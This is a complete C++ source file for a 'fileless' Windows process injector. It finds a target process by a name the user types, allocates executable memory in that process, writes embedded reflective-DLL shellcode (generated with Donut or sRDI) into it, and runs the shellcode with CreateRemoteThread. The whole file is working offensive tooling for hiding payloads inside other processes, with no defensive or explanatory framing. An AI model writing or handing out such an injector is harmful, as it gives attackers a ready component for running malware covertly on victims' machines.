// fileless_dll_injector.cpp
// Requires reflective_dll.h generated from your DLL via Donut or sRDI

#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include "reflective_dll.h" // Generated with xxd -i from your shellcode

using namespace std;

DWORD GetProcessIdByName(const string& procName) {
    PROCESSENTRY32 entry = { 0 };
    entry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    while (Process32Next(snapshot, &entry)) {
        if (_stricmp(entry.szExeFile, procName.c_str()) == 0) {
            CloseHandle(snapshot);
            return entry.th32ProcessID;
        }
    }
    CloseHandle(snapshot);
    return 0;
}

bool InjectReflectiveDLL(DWORD pid, unsigned char* dllBytes, size_t dllSize) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        cerr << "Failed to open process. Error: " << GetLastError() << endl;
        return false;
    }

    LPVOID remoteMem = VirtualAllocEx(hProc, NULL, dllSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        cerr << "Failed to allocate memory. Error: " << GetLastError() << endl;
        CloseHandle(hProc);
        return false;
    }

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, remoteMem, dllBytes, dllSize, &written) || written != dllSize) {
        cerr << "Failed to write memory. Error: " << GetLastError() << endl;
        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return false;
    }

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (!hThread) {
        cerr << "Failed to create remote thread. Error: " << GetLastError() << endl;
        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return false;
    }

    CloseHandle(hThread);
    CloseHandle(hProc);
    return true;
}

int main() {
    string procName;
    cout << "Enter process name to inject into: ";
    getline(cin, procName);

    DWORD pid = GetProcessIdByName(procName);
    if (!pid) {
        cerr << "Process not found." << endl;
        return -1;
    }

    if (!InjectReflectiveDLL(pid, ReflectiveDLL, ReflectiveDLLSize)) {
        cerr << "Injection failed." << endl;
        return -1;
    }

    cout << "Injection successful." << endl;
    return 0;
}
